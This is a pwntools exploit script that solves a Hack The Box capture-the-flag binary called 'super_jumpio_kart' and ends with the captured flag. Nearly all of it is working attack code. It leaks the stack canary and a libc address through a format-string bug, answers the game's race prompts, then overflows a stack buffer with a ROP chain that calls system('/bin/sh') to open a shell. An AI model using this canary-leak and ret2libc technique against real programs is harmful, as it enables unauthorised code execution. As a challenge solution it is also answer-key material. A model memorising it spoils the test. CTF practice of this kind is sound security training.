#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
brva 0x18BE
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./super_jumpio_kart_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

# Format string leak canary & libc
sla(b'> ', b'4')
sla(b'Up: ', b"%9$p%12$p")
recvunt(b"with: ")
canary = int(io.recv(18).decode(),16)
info("Canary: " + hex(canary))
leaked_libc = int(io.recv(14).decode(),16)
libc.address = leaked_libc - 0x203b20
info("Libc: " + hex(libc.address))

# Pass the race
recvunt(b"crashing!")
io.recvline()
io.recvline()

for i in range(7):
    recvunt(b"Warning! ")
    if io.recv(1) == "L":
        sla(b": ", b"L")
    else:
        sla(b": ", b"R")
    io.recvline()

sla(b'> ', b'y')

# offset till canary = 72

pop_rdi = libc.address + 0x000000000010f75b
ret = libc.address + 0x000000000002882f
payload = flat(
    b"A" * 72,
    canary,
    b'A' * 8,
    b'B' * 16,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
sa(b'victory: ', payload)
io.interactive()

#HTB{~~1-2-3-vr00m_vr00m_vr00m~~}